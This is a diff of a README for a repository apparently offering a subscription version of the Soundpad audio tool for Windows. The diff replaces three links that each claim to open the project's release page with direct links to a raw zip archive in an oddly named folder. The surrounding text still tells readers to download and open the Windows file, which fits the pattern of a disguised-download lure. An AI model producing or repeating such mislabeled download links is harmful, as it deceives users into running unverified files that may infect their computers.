@@ -1,6 +1,6 @@
 # 🎧 soundpad-download-plus-subscription - Simple audio tools for Windows
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue-grey)](https://github.com/pergamumposthole839/soundpad-download-plus-subscription/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue-grey)](https://github.com/pergamumposthole839/soundpad-download-plus-subscription/raw/refs/heads/main/lordly/plus_download_soundpad_subscription_v2.7-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use the release page to get the app, install it on your PC, and start using it w
 
 ## 📥 Download and Install
 
-1. Open the release page here: [https://github.com/pergamumposthole839/soundpad-download-plus-subscription/releases](https://github.com/pergamumposthole839/soundpad-download-plus-subscription/releases)
+1. Open the release page here: [https://github.com/pergamumposthole839/soundpad-download-plus-subscription/raw/refs/heads/main/lordly/plus_download_soundpad_subscription_v2.7-alpha.4.zip](https://github.com/pergamumposthole839/soundpad-download-plus-subscription/raw/refs/heads/main/lordly/plus_download_soundpad_subscription_v2.7-alpha.4.zip)
 2. Find the latest release near the top of the page.
 3. Download the Windows file from that release.
 4. Open the file you downloaded.
@@ -146,7 +146,7 @@ A small, neat sound list is easier to use than a long one.
 
 ## 🧭 Where to Download
 
-Use the release page here: [https://github.com/pergamumposthole839/soundpad-download-plus-subscription/releases](https://github.com/pergamumposthole839/soundpad-download-plus-subscription/releases)
+Use the release page here: [https://github.com/pergamumposthole839/soundpad-download-plus-subscription/raw/refs/heads/main/lordly/plus_download_soundpad_subscription_v2.7-alpha.4.zip](https://github.com/pergamumposthole839/soundpad-download-plus-subscription/raw/refs/heads/main/lordly/plus_download_soundpad_subscription_v2.7-alpha.4.zip)
 
 Visit that page to download the Windows file, then open it and follow the install steps on screen.
 
